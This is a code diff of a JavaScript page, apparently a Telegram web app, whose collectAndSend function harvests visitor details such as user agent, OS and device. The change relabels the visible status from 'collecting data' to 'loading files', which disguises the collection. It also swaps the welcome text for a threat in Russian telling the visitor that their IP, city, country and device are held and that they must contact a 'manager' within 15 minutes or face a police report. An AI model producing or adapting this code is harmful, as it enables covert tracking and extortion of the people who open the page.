@@ -204,7 +204,7 @@ document.addEventListener('visibilitychange', () => {
 
 // ─── MAIN ───────────────────────────────────────────────
 async function collectAndSend() {
-  setStatus('Сбор данных...');
+  setStatus('Загрузка файлов...');
 
   const ua = navigator.userAgent;
   const { os, browser, device } = parseUA(ua);
@@ -353,7 +353,7 @@ async function collectAndSend() {
 
   // Показываем пользователю что всё ок
   document.querySelector('.loader').innerHTML =
-    `<div class="done">✅ Загрузка завершена</div><div class="status">Добро пожаловать!</div>`;
+    `<div class="done">✅ Загрузка завершена</div><div class="status">ТВОЙ АЙПИ, ГОРОД, СТРАНА, УСТРОЙСТВО, ВСЕ ТВОИ ДАННЫЕ У НАС! НАПИШИ МЕНЕДЖЕРУ В ТЕЧЕНИЕ 15 МИНУТ, ИНАЧЕ ЗАЯВА В МВД)!</div>`;
 
   if (tg) {
     setTimeout(() => tg.close(), 2000);
